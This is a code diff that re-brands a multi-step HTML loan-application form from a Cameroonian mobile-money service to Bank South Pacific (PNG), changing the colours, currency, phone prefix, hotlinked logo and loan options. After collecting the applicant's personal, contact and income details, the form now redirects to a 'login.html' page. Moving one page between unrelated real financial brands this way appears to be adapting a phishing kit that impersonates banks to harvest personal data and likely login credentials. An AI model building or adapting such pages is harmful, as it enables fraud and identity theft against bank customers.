@@ -4,21 +4,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Max it Cameroon - Secure Loan Application</title>
+    <title>BSP Papua New Guinea - Secure Loan Application</title>
 
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;800&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
          :root {
-            --orange: #FF7900;
-            --orange-hover: #e66a00;
-            --dark: #1a1a1a;
-            --text-gray: #4a5568;
+            --bsp-green: #006837;
+            --bsp-green-hover: #004d28;
+            --bsp-gold: #ffc20e;
+            --dark: #111827;
+            --text-gray: #4b5563;
             --border-color: #cbd5e1;
-            --glass-bg: rgba(255, 255, 255, 0.7);
-            --glass-border: rgba(255, 255, 255, 0.8);
-            --glass-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.1);
+            --glass-bg: rgba(255, 255, 255, 0.9);
+            --glass-border: rgba(255, 255, 255, 0.95);
+            --glass-shadow: 0 10px 30px rgba(0, 104, 55, 0.12);
             --error-red: #ef4444;
         }
         
@@ -30,7 +31,7 @@
         }
         
         body {
-            background-color: #f0f4f8;
+            background-color: #f3f4f6;
             color: var(--dark);
             min-height: 100vh;
             display: flex;
@@ -52,7 +53,7 @@
         .orb-1 {
             width: 400px;
             height: 400px;
-            background: rgba(255, 121, 0, 0.3);
+            background: rgba(0, 104, 55, 0.15);
             top: -10%;
             left: -5%;
         }
@@ -60,7 +61,7 @@
         .orb-2 {
             width: 350px;
             height: 350px;
-            background: rgba(0, 150, 255, 0.2);
+            background: rgba(255, 194, 14, 0.18);
             bottom: -5%;
             right: -5%;
             animation-delay: -5s;
@@ -82,8 +83,8 @@
             border: 1px solid var(--glass-border);
             box-shadow: var(--glass-shadow);
             width: 100%;
-            max-width: 500px;
-            border-radius: 24px;
+            max-width: 520px;
+            border-radius: 20px;
             padding: 40px;
             position: relative;
             overflow: hidden;
@@ -96,18 +97,53 @@
             left: 0;
             right: 0;
             height: 6px;
-            background: var(--orange);
+            background: var(--bsp-green);
+        }
+        
+        .brand-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .brand-header img {
+            height: 42px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .brand-text {
+            display: flex;
+            flex-direction: column;
+            text-align: left;
+        }
+        
+        .brand-title {
+            color: var(--bsp-green);
+            font-weight: 800;
+            font-size: 20px;
+            line-height: 1.1;
+        }
+        
+        .brand-subtitle {
+            font-size: 11px;
+            color: var(--text-gray);
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
         
         .form-header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
         
         .form-header h2 {
-            font-size: 28px;
+            font-size: 24px;
             font-weight: 800;
-            margin-bottom: 8px;
+            color: var(--dark);
+            margin-bottom: 6px;
         }
         
         .form-header p {
@@ -125,14 +161,14 @@
         .progress-segment {
             height: 6px;
             width: 33%;
-            background-color: rgba(0, 0, 0, 0.05);
+            background-color: rgba(0, 0, 0, 0.08);
             border-radius: 10px;
             transition: all 0.4s ease;
         }
         
         .progress-segment.active {
-            background-color: var(--orange);
-            box-shadow: 0 0 8px rgba(255, 121, 0, 0.4);
+            background-color: var(--bsp-green);
+            box-shadow: 0 0 8px rgba(0, 104, 55, 0.3);
         }
         
         .form-group {
@@ -143,8 +179,8 @@
         .form-group label {
             display: block;
             font-size: 13px;
-            font-weight: 600;
-            color: var(--text-gray);
+            font-weight: 700;
+            color: var(--dark);
             margin-bottom: 8px;
         }
         
@@ -168,10 +204,11 @@
             border-radius: 12px;
             font-size: 15px;
             color: var(--dark);
-            background-color: rgba(255, 255, 255, 0.9);
+            background-color: #ffffff;
             outline: none;
             transition: all 0.3s;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.02);
+            border: 1px solid #e2e8f0;
         }
         
         select.form-control,
@@ -180,9 +217,9 @@
         }
         
         .form-control:focus {
-            border-color: var(--orange);
+            border-color: var(--bsp-green);
             background-color: #fff;
-            box-shadow: 0 0 0 4px rgba(255, 121, 0, 0.1);
+            box-shadow: 0 0 0 4px rgba(0, 104, 55, 0.1);
         }
         
         .form-control.error {
@@ -191,7 +228,7 @@
         
         textarea.form-control {
             resize: vertical;
-            min-height: 100px;
+            min-height: 90px;
         }
         
         .phone-input-group {
@@ -200,14 +237,15 @@
         }
         
         .country-code {
-            background-color: rgba(255, 255, 255, 0.9);
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
             border-radius: 12px;
             padding: 0 15px;
-            font-weight: 600;
+            font-weight: 700;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: var(--dark);
+            color: var(--bsp-green);
         }
         
         .phone-input-group .form-control {
@@ -215,18 +253,21 @@
         }
         
         .summary-box {
-            background: rgba(255, 255, 255, 0.9);
-            border-left: 4px solid var(--orange);
+            background: #ffffff;
+            border-left: 4px solid var(--bsp-green);
             border-radius: 12px;
             padding: 20px;
             margin-bottom: 25px;
             box-shadow: 0 4px 15px rgba(0, 0, 0, 0.03);
+            border: 1px solid #e5e7eb;
+            border-left: 4px solid var(--bsp-green);
         }
         
         .summary-box h4 {
-            font-size: 16px;
+            font-size: 15px;
             margin-bottom: 15px;
             font-weight: 800;
+            color: var(--dark);
         }
         
         .summary-row {
@@ -250,12 +291,12 @@
         
         .summary-value {
             color: var(--dark);
-            font-weight: 600;
+            font-weight: 700;
             text-align: right;
         }
         
         .highlight-value {
-            color: var(--orange);
+            color: var(--bsp-green);
             font-size: 18px;
             font-weight: 800;
         }
@@ -282,14 +323,15 @@
         }
         
         .btn-primary {
-            background-color: var(--orange);
+            background-color: var(--bsp-green);
             color: white;
-            box-shadow: 0 4px 15px rgba(255, 121, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 104, 55, 0.3);
         }
         
         .btn-primary:hover {
+            background-color: var(--bsp-green-hover);
             transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(255, 121, 0, 0.4);
+            box-shadow: 0 6px 20px rgba(0, 104, 55, 0.4);
         }
         
         .btn-secondary {
@@ -323,6 +365,15 @@
     <div class="orb orb-2"></div>
 
     <div class="form-container">
+        <!-- BSP Header -->
+        <div class="brand-header">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRWT8bIs9HbvF2wOzszfmJ24S2rWFrWT7bM4vQsSFsdglqPy7QTap5WS7Gg&s=10" alt="BSP Logo" onerror="this.src='https://placehold.co/120x45/006837/ffffff?text=BSP+PNG'">
+            <div class="brand-text">
+                <span class="brand-title">BSP</span>
+                <span class="brand-subtitle">PNG Personal Loans</span>
+            </div>
+        </div>
+
         <div class="form-header">
             <h2>Loan Application</h2>
             <p id="step-indicator">Step 1: Loan Details</p>
@@ -335,23 +386,24 @@
 
         <form id="loanForm">
 
+            <!-- Step 1: Loan Details -->
             <div class="form-step active" id="step-1">
                 <div class="form-group">
                     <label>Loan Type</label>
                     <select class="form-control" id="loanType" required>
                         <option value="" disabled selected>Select a loan type...</option>
-                        <option value="Personal Loan">Personal Loan</option>
-                        <option value="Business/SME Loan">Business/SME Loan</option>
-                        <option value="Education/Student Loan">Education/Student Loan</option>
-                        <option value="Emergency/Medical Loan">Emergency/Medical Loan</option>
-                        <option value="Home Improvement">Home Improvement</option>
+                        <option value="Personal Consumer Loan">Personal Consumer Loan</option>
+                        <option value="SME & Business Loan">SME & Business Loan</option>
+                        <option value="Education & School Fees Loan">Education & School Fees Loan</option>
+                        <option value="Emergency & Medical Loan">Emergency & Medical Loan</option>
+                        <option value="Home Improvement Loan">Home Improvement Loan</option>
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>Loan Amount (XAF)</label>
+                    <label>Loan Amount (PGK)</label>
                     <div class="input-wrapper">
                         <i class="fa-solid fa-money-bill-wave"></i>
-                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 250000" min="25000" max="2500000" step="25000" required>
+                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 10000" min="500" max="50000" step="250" required>
                     </div>
                 </div>
                 <div class="form-group">
@@ -360,10 +412,11 @@
                         <option value="" disabled selected>Select duration...</option>
                         <option value="3">3 Months</option>
                         <option value="6">6 Months</option>
-                        <option value="9">9 Months</option>
                         <option value="12">12 Months (1 Year)</option>
-                        <option value="18">18 Months</option>
                         <option value="24">24 Months (2 Years)</option>
+                        <option value="36">36 Months (3 Years)</option>
+                        <option value="48">48 Months (4 Years)</option>
+                        <option value="60">60 Months (5 Years)</option>
                     </select>
                 </div>
                 <div class="form-group">
@@ -376,6 +429,7 @@
                 </div>
             </div>
 
+            <!-- Step 2: Personal Information -->
             <div class="form-step" id="step-2">
                 <div class="form-group">
                     <label>First Name</label>
@@ -395,14 +449,14 @@
                     <label>Email Address</label>
                     <div class="input-wrapper">
                         <i class="fa-regular fa-envelope"></i>
-                        <input type="email" class="form-control" id="email" placeholder="you@example.com" required>
+                        <input type="email" class="form-control" id="email" placeholder="name@domain.com.pg" required>
                     </div>
                 </div>
                 <div class="form-group">
-                    <label>Orange Money / Mobile Money Number</label>
+                    <label>BSP Kundu Account / Mobile Phone Number</label>
                     <div class="phone-input-group">
-                        <div class="country-code">+237</div>
-                        <input type="tel" class="form-control" id="phone" placeholder="699000000" maxlength="9" pattern="[0-9]{9}" required>
+                        <div class="country-code">+675</div>
+                        <input type="tel" class="form-control" id="phone" placeholder="70000000" maxlength="8" pattern="[0-9]{8}" required>
                     </div>
                 </div>
 
@@ -412,6 +466,7 @@
                 </div>
             </div>
 
+            <!-- Step 3: Financial & Summary -->
             <div class="form-step" id="step-3">
                 <div class="form-group">
                     <label>Employment Status</label>
@@ -421,36 +476,34 @@
                         <option value="Part-Time Employed">Part-Time Employed</option>
                         <option value="Self-Employed / Freelance">Self-Employed / Freelance</option>
                         <option value="Business Owner">Business Owner</option>
-                        <option value="Student">Student</option>
-                        <option value="Retired">Retired</option>
-                        <option value="Unemployed">Unemployed</option>
+                        <option value="Government Employee">Government Employee</option>
+                        <option value="Student / Other">Student / Other</option>
                     </select>
                 </div>
                 <div class="form-group">
                     <label>Industry / Sector</label>
                     <select class="form-control" id="empSector" required>
                         <option value="" disabled selected>Select industry...</option>
-                        <option value="Technology & IT">Technology & IT</option>
+                        <option value="Public Sector & Government">Public Sector & Government</option>
+                        <option value="Mining, Oil & Gas">Mining, Oil & Gas</option>
                         <option value="Healthcare & Medical">Healthcare & Medical</option>
                         <option value="Education">Education</option>
                         <option value="Finance & Banking">Finance & Banking</option>
                         <option value="Retail & Trade">Retail & Trade</option>
-                        <option value="Construction & Real Estate">Construction & Real Estate</option>
-                        <option value="Government & Public Sector">Government & Public Sector</option>
-                        <option value="Agriculture">Agriculture</option>
+                        <option value="Agriculture & Forestry">Agriculture & Forestry</option>
                         <option value="Other">Other</option>
                     </select>
                 </div>
                 <div class="form-group">
-                    <label>Estimated Monthly Income (XAF)</label>
+                    <label>Estimated Monthly Income (PGK)</label>
                     <div class="input-wrapper">
                         <i class="fa-solid fa-wallet"></i>
-                        <input type="number" class="form-control" id="monthlyIncome" placeholder="e.g. 150000" required>
+                        <input type="number" class="form-control" id="monthlyIncome" placeholder="e.g. 3500" required>
                     </div>
                 </div>
 
                 <div class="summary-box">
-                    <h4><i class="fa-solid fa-file-invoice-dollar" style="color: var(--orange); margin-right: 8px;"></i> Application Summary</h4>
+                    <h4><i class="fa-solid fa-file-invoice-dollar" style="color: var(--bsp-green); margin-right: 8px;"></i> Application Summary</h4>
                     <div class="summary-row">
                         <span class="summary-label">Applicant:</span>
                         <span class="summary-value" id="sum-name">-</span>
@@ -480,7 +533,15 @@
 
     <script>
         const stepTitles = ["Step 1: Loan Details", "Step 2: Personal Info", "Step 3: Financial Profile"];
-        const ANNUAL_INTEREST_RATE = 0.18;
+        const ANNUAL_INTEREST_RATE = 0.16; // 16% p.a. BSP Personal Loan rate
+
+        // Prefill initial values if set from index.html
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedAmount = sessionStorage.getItem('bspLoanAmount');
+            const savedTerm = sessionStorage.getItem('bspLoanTerm');
+            if (savedAmount) document.getElementById('loanAmount').value = savedAmount;
+            if (savedTerm) document.getElementById('loanTerm').value = savedTerm;
+        });
 
         function validateCurrentStep(stepNumber) {
             const currentStep = document.getElementById(`step-${stepNumber}`);
@@ -541,13 +602,17 @@
             updateUI(currentStep - 1);
         }
 
+        function formatPGK(val) {
+            return 'K ' + Math.round(val).toLocaleString('en-US');
+        }
+
         function populateSummary() {
             const amount = parseFloat(document.getElementById('loanAmount').value);
             const months = parseInt(document.getElementById('loanTerm').value);
             const firstName = document.getElementById('firstName').value;
             const lastName = document.getElementById('lastName').value;
 
-            sessionStorage.setItem('loanAmount', amount);
+            sessionStorage.setItem('bspLoanAmount', amount);
 
             let emi = 0;
             if (amount && months) {
@@ -556,9 +621,9 @@
             }
 
             document.getElementById('sum-name').innerText = `${firstName} ${lastName}`;
-            document.getElementById('sum-amount').innerText = `${amount.toLocaleString()} XAF`;
+            document.getElementById('sum-amount').innerText = formatPGK(amount);
             document.getElementById('sum-term').innerText = `${months} Months`;
-            document.getElementById('sum-emi').innerText = `${Math.round(emi).toLocaleString()} XAF`;
+            document.getElementById('sum-emi').innerText = `${formatPGK(emi)} / mo`;
         }
 
         function submitApplication() {
@@ -567,10 +632,10 @@
             const btn = document.getElementById('submitBtn');
             btn.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Processing...';
             btn.style.opacity = '0.8';
-            btn.style.disabled = true;
+            btn.disabled = true;
 
             setTimeout(() => {
-                window.location.href = 'process.html';
+                window.location.href = 'login.html';
             }, 1500);
         }
 
